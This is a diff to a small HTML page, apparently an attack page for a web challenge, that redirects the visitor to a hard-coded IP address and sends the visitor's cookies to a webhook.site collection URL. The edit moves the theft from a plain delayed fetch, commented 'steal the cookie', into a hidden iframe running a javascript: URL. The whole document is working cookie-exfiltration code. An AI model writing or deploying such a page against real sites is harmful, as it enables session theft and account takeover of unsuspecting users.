@@ -1,16 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Cookie Reader</title>
+  <title>Redirecting...</title>
+  <script>
+    // Redirect to report.html first
+    window.location = "http://167.71.200.118:7002/report";
+  </script>
 </head>
 <body>
-  <h1>Cookies:</h1>
-  <script>
-  window.location = "http://167.71.200.118:7002/report";
-  // After a delay, steal the cookie
-  setTimeout(() => {
-    fetch("https://webhook.site/be8207e9-fda6-4721-87a4-b2f41d965ac2?cookie=" + encodeURIComponent(document.cookie));
-  }, 1000);
-</script>
+  <!-- Hidden iframe to run JS after redirect -->
+  <iframe
+    src="javascript:setTimeout(()=>{
+      parent.fetch('https://webhook.site/be8207e9-fda6-4721-87a4-b2f41d965ac2?cookie='+encodeURIComponent(document.cookie));
+    }, 1000)"
+    style="display:none">
+  </iframe>
 </body>
 </html>
